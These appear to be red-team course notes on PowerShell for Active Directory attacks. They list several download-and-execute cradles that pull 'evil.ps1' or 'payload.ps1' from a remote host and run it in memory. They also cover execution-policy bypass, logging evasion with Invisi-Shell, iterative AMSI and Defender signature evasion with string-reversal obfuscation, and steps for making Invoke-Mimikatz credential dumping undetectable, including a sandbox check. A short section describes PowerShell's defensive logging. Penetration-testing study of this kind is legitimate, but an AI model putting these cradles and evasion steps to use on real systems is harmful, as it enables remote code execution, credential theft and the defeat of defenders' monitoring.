# Powershell

PowerShell provides access to almost everything on a Windows platform and Active Directory Environment. While this is useful for administrators, it can also be leveraged by attackers.

### **Key Features**

* **In-memory execution**: Allows running powerful scripts directly from memory, making it ideal for foothold shells/boxes.
* **Ease of use**: Easy to learn and extremely powerful.
* **.NET Integration**: Based on the .NET framework and tightly integrated with Windows.

### **Important Clarification**

* PowerShell is **NOT** just `powershell.exe`. It is actually the library **System.Management.Automation.dll**.

### **Version Used**

We will use **Windows PowerShell**, but there is also a platform-independent version called **PowerShell Core**.

## PowerShell Scripts and Modules

***

**Dot Sourcing a PowerShell Script** To load a PowerShell script using dot sourcing:

```powershell
 . C:\AD\Tools\PowerView.ps1
```

### **Importing a Module or Script**

A module (or a script) can be imported with the following command:

```powershell
 Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### **Listing Commands in a Module**

To list all the commands in a specific module:

```powers
Get-Command -Module 
```

## PowerShell Script Execution

***

_Download Execute Cradle FROM MEMORY_\* To download and execute a script from a remote source, you can use the following command:

```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```

* **`iex`**: Stands for "Invoke-Expression", used to execute the downloaded string as PowerShell code.
* **`New-Object Net.WebClient`**: Creates a new WebClient object to handle HTTP requests.
* **`DownloadString`**: Downloads the content of the specified URL as a string.

### **Using Internet Explorer COM Object**

```powershell
$ie = New-Object -ComObject InternetExplorer.Application
$ie.visible = $False
$ie.navigate('http://192.168.230.1/evil.ps1')
sleep 5
$response = $ie.Document.body.innerHTML
$ie.quit()
iex $response
```

* **`-ComObject InternetExplorer.Application`**: Creates an Internet Explorer COM object.
* **`navigate`**: Directs the browser to the specified URL.
* **`Document.body.innerHTML`**: Retrieves the HTML content of the page, which can include scripts.
* **`iex $response`**: Executes the retrieved content as PowerShell code.

### **From PowerShell v3 Onwards**

```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')
```

* **`iwr`**: Stands for "Invoke-WebRequest", a simpler way to fetch data from a URL compared to `WebClient`.

***

**Using MSXML2.XMLHTTP**

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET', 'http://192.168.230.1/evil.ps1', $false)
$h.send()
iex $h.responseText
```

* **`Msxml2.XMLHTTP`**: An older COM object for HTTP requests.
* **`open`**: Prepares the object for a GET request to the specified URL.
* **`send`**: Sends the request and retrieves the response.
* **`responseText`**: Contains the text of the response, which can be executed.

***

**Using System.NET.WebRequest**

```powershell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

* **`System.NET.WebRequest`**: .NET class for creating and managing HTTP requests.
* **`GetResponse`**: Retrieves the response from the request.
* **`StreamReader`**: Reads the response stream into a string.
* **`ReadToEnd`**: Reads the entire response stream until the end.
* **`IEX`**: Executes the string as PowerShell code.

## PowerShell Detections

**Overview** PowerShell has multiple detection and logging mechanisms designed to enhance security by monitoring and restricting suspicious activities. Here are the key features:

***

**System-Wide Transcription**

* **Description**: Logs all input and output from PowerShell sessions, including executed commands and their results.
* **Purpose**: Provides a complete audit trail of PowerShell activity for forensic analysis.
* **Configuration**: Enabled via Group Policy under `Administrative Templates > Windows Components > Windows PowerShell`.

***

**Script Block Logging**

* **Description**: Captures and logs the content of PowerShell script blocks as they are executed, even if they are obfuscated.
* **Purpose**: Helps identify potentially malicious scripts, including those dynamically generated at runtime.
* **Details**: Logs are stored in the Windows Event Log under `Microsoft-Windows-PowerShell/Operational`.

***

**AntiMalware Scan Interface (AMSI)**

* **Description**: Allows PowerShell scripts to be scanned by antivirus or anti-malware solutions in real time before execution.
* **Key Features**:
  * Detects and blocks known malicious patterns in scripts.
  * Bypasses obfuscation by sending the de-obfuscated script content to the scanner.
* **Integration**: Works with Windows Defender or third-party antivirus solutions.

***

**Constrained Language Mode (CLM)**

* **Description**: Restricts the language features available in PowerShell to reduce the attack surface.
* **Purpose**: Limits the use of advanced features (e.g., .NET class access, Add-Type) to block common attack vectors.
* **Integration**: Often used with:
  * **AppLocker**: To enforce application whitelisting policies.
  * **WDAC (Windows Defender Application Control)**: For stricter device security.
* **Typical Use Case**: Enforced on non-administrative accounts or when running scripts in locked-down environments.

***

**Practical Usage**

*   **System-Wide Transcription**: To enable transcription for all users:

    ```powershell
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
    ```
*   **Script Block Logging**: To enable script block logging:

    ```powershell
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
    ```
*   **Constrained Language Mode**: To verify the current language mode:

    ```powershell
    $ExecutionContext.SessionState.LanguageMode
    ```

## Execution Policy

_What is Execution Policy?_\*

* Execution Policy is **NOT** a security measure. Its primary purpose is to prevent users from unintentionally executing scripts.
* It acts as a safety feature rather than a strict security boundary.

***

**Ways to Bypass Execution Policy** PowerShell provides several ways to bypass the Execution Policy. These are useful for testing or when restrictions are in place.

#### Using `-ExecutionPolicy Bypass`

```powershell
powershell -ExecutionPolicy Bypass
```

## Bypassing PowerShell Security

**Introduction** To bypass security controls in PowerShell, tools like **Invisi-Shell** can be used. This tool allows attackers to execute commands without being logged, effectively evading standard monitoring mechanisms.

***

**What is Invisi-Shell?**

* **Repository**: [Invisi-Shell GitHub](https://github.com/OmerYa/Invisi-Shell)
* **Purpose**: Bypasses PowerShell logging mechanisms by manipulating .NET assemblies.
* **How it Works**:
  * Hooks into .NET assemblies like:
    * `System.Management.Automation.dll`
    * `System.Core.dll`
  * Prevents logging of commands and actions in PowerShell operational logs.

***

**CLR Profiler API**

* **Description**: Invisi-Shell uses the **Common Language Runtime (CLR) Profiler API** to perform hooks.
* **Definition**:
  * A **CLR Profiler** is a **dynamic link library (DLL)** that interacts with the CLR.
  * It sends and receives messages using the profiling API.
  * The profiler DLL is loaded by the CLR at runtime to monitor or modify behavior.
* **Purpose in Invisi-Shell**:
  * Hooks PowerShell's core functionality to intercept and disable logging mechanisms.

***

**Why is this Important?**

* Standard detection methods (e.g., Script Block Logging, AMSI) rely on PowerShell's internal logging.
* Invisi-Shell bypasses these mechanisms, making detection extremely difficult.
* It highlights the importance of monitoring process-level behaviors and not just logs.

## Using Invisi-Shell

**Execution Options** Invisi-Shell provides two ways to execute PowerShell commands, depending on the user's privileges.

***

**With Admin Privileges**

*   Use the following batch file to execute Invisi-Shell with administrative rights:

    ```plaintext
    RunWithPathAsAdmin.bat
    ```
* **Purpose**: This method hooks into the system paths and requires elevated privileges to manipulate them.

***

**With Non-Admin Privileges**

*   Use the following batch file for non-admin execution:

    ```plaintext
    RunWithRegistryNonAdmin.bat
    ```
* **Purpose**: This method uses registry-based hooks to avoid the need for elevated privileges.

***

\[**Exiting the Session**

*   After completing your tasks in the new PowerShell session, type the following command to clean up:

    ```plaintext
    exit
    ```
* **Why?**: Exiting ensures the session is terminated, and any temporary hooks or changes are properly cleared.

## Bypassing AV Signatures for PowerShell

**Introduction** Antivirus (AV) solutions like Windows Defender rely on signature-based detection to identify malicious scripts. To bypass these detections, various tools and techniques can be used.

***

**AMSI Bypass and Signature Evasion**

* **In-memory Execution**: Loading scripts directly into memory helps avoid detection by bypassing on-disk scanning.
* **AMSITrigger**: A tool to identify which part of a PowerShell script triggers detection by AMSI.
  * Repository: [AMSITrigger on GitHub](https://github.com/RythmStick/AMSITrigger)
* **DefenderCheck**: A tool to pinpoint code or strings in a binary/file that are flagged by Windows Defender.
  * Repository: [DefenderCheck on GitHub](https://github.com/t3hbb/DefenderCheck)

***

**Using AMSITrigger and DefenderCheck** Provide the path to the script or file to scan:

*   **AMSITrigger Example**:

    ```plaintext
    AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
    ```
*   **DefenderCheck Example**:

    ```plaintext
    DefenderCheck.exe PowerUp.ps1
    ```

***

**Full Script Obfuscation**

* For complete obfuscation of PowerShell scripts, use the **Invoke-Obfuscation** tool.
* This tool is specifically designed to obfuscate scripts and bypass AMSI detection.
* Repository: [Invoke-Obfuscation on GitHub](https://github.com/danielbohannon/Invoke-Obfuscation)

***

**Key Considerations**

* These tools should be used ethically and responsibly, adhering to organizational policies.
* Proper obfuscation and bypass techniques are essential for penetration testers but should never be used for malicious purposes.

***

## Steps to Avoid Signature-Based Detection

**Overview** The process to bypass signature-based detection using AMSITrigger is straightforward and iterative.

***

**Step-by-Step Process**

1. **Scan Using AMSITrigger**
   * Use AMSITrigger to analyze the script and identify which parts trigger the antivirus detection.
   *   Example command:

       ```plaintext
       AmsiTrigger_x64.exe -i <path_to_script>
       ```
2. **Modify the Detected Code Snippet**
   * Make adjustments to the identified part of the script.
   * Common techniques:
     * Change variable names.
     * Obfuscate functions or strings.
     * Introduce no-op operations to modify the signature.
3. **Rescan Using AMSITrigger**
   * Run the modified script through AMSITrigger again to check for changes in detection.
   *   Example command:

       ```plaintext
       AmsiTrigger_x64.exe -i <path_to_modified_script>
       ```
4. **Repeat Steps 2 & 3**
   * Continue modifying and rescanning until the result is either:
     * **`AMSI_RESULT_NOT_DETECTED`**
     * **`Blank` (No detection)**

***

**Tips for Efficiency**

* Focus on the smallest changes needed to bypass detection.
* Use tools like Invoke-Obfuscation to automate parts of the process.
* Maintain backups of the original script in case of errors during modification.

## Scan Using AMSITrigger

\[**What AMSITrigger Identifies** AMSITrigger helps pinpoint the exact code snippet in a PowerShell script that triggers antivirus detection.

***

**Detected Code Snippet** In the example shown, the code snippet flagged by AMSITrigger is:

```powershell
[Reflection.Assembly]::Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
```

* **What it does**:
  * `[Reflection.Assembly]`: Accesses .NET assemblies via reflection.
  * `.GetType('System.AppDomain')`: Retrieves the type information for `System.AppDomain`.
  * `.GetProperty('CurrentDomain')`: Accesses the `CurrentDomain` property.
  * `.GetValue($null, @())`: Retrieves the value of the property.
* **Why it's flagged**:
  * Such constructs are commonly used in scripts to manipulate the .NET runtime or load assemblies dynamically, which are typical behaviors of malware.

***

**Techniques for Obfuscation** One way to bypass detection is to obscure strings in the code by reversing them and reconstructing them dynamically at runtime. This example demonstrates how to reverse the `"System.AppDomain"` string to evade signature detection.

***

**Reversing a String** Original flagged line:

```powershell
[Reflection.Assembly]::Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
```

Obfuscated version:

```powershell
$String = 'niamoDppA.metsyS'
$classrev = ([regex]::Matches($String, '.', 'RightToLeft') | ForEach { $_.Value }) -join ''
$AppDomain = [Reflection.Assembly]::Assembly.GetType("$classrev").GetProperty('CurrentDomain').GetValue($null, @())
```

* **Steps Explained**:
  * `$String = 'niamoDppA.metsyS'`: The string is reversed.
  * `[regex]::Matches`: Matches each character in the string from right to left.
  * `ForEach { $_.Value }`: Iterates over the matches to extract each character.
  * `-join ''`: Combines the reversed characters back into the original string at runtime.
  * `$AppDomain`: Executes the original functionality using the reconstructed string.

***

**Testing the Modification**

* After obfuscating the script, run it through AMSITrigger again to verify if the detection has been bypassed.
*   Example result:

    ```plaintext
    AMSI_RESULT_NOT_DETECTED
    ```

## Bypassing AV Signatures for PowerShell - Invoke-Mimikatz

**What is Invoke-Mimikatz?**

* **Invoke-Mimikatz** is one of the most heavily signatured PowerShell scripts.
* It is designed to run Mimikatz in memory using PowerShell to extract credentials, making it a frequent target for antivirus detections.

***

**Pre-Scanning Requirement**

* Before scanning the script with **AMSITrigger**, **rename the script file** to avoid access-denied errors.
*   Example:

    ```plaintext
    Rename-Item -Path "Invoke-Mimikatz.ps1" -NewName "mimi.ps1"
    ```

***

**Detection with AMSITrigger**

*   When scanning Invoke-Mimikatz using AMSITrigger, multiple flagged strings appear:

    ```plaintext
    [+] "Invoke-Mimikatz"
    [+] "Invoke-ReflectivePEInjection"
    [+] "Add-Member NoteProperty"
    ```
* These strings correspond to:
  * Function names: e.g., `Invoke-Mimikatz` and `Invoke-ReflectivePEInjection`.
  * Code patterns that AV signatures are trained to detect.

***

\[!list] **Changes to Implement**

1. **Remove Default Comments**
   * Remove all default or obvious comments that may reveal the script’s purpose or origin.
   *   Example:

       ```powershell
       # Original comment: This function loads Mimikatz.
       ```
2. **Rename Script, Function Names, and Variables**
   * Change all function and variable names to generic or random names to avoid matching known signatures.
   *   Example:

       ```powershell
       function Invoke-CredsDump { # Replace Invoke-Mimikatz
       ```
3. **Modify Win32 API Call Variable Names**
   * Obfuscate or rename variables used in Win32 API calls to avoid detection.
   *   Example:

       ```powershell
       $VirtualAllocEx = "VirtualAllocate" # Replace VirtualAllocEx
       ```
4. **Obfuscate PEBBytes Content**
   * Use packers or other tools to obfuscate the content of PowerKatz DLLs.
   * Pack the payload to make its content unreadable to static analysis tools.
5. **Implement Reverse Function for PEBBytes**
   * Reverse or encode the PEBBytes payload to avoid static detection.
   * Decode it dynamically during execution.
6. **Add a Sandbox Check**
   * Implement checks to detect if the script is running in a sandbox environment (commonly used by AV for analysis).
   *   Example:

       ```powershell
       if ((Get-Process | Where-Object { $_.Name -like "*sandbox*" }).Count -gt 0) {
           Exit
       }
       ```
7. **Remove Reflective PE Warnings**
   * Remove any reflective PE injection warnings or comments that AV might flag.
8. **Use Obfuscated Commands for Invoke-Mimikatz**
   * Utilize Invoke-MimiEx with obfuscated commands to avoid triggering signature detection.
9. **Analyze with DefenderCheck**
   * After making changes, use DefenderCheck to verify if the modified script is still flagged.
   *   Example:

       ```plaintext
       DefenderCheck.exe <Modified_Script.ps1>
       ```

***

**Detailed Explanations**

* **Obfuscating PEBBytes**: Packing tools like UPX can help scramble the content of DLLs and payloads.
* **Reverse Function for PEBBytes**: Using techniques such as Base64 encoding or string reversal helps avoid static detections.
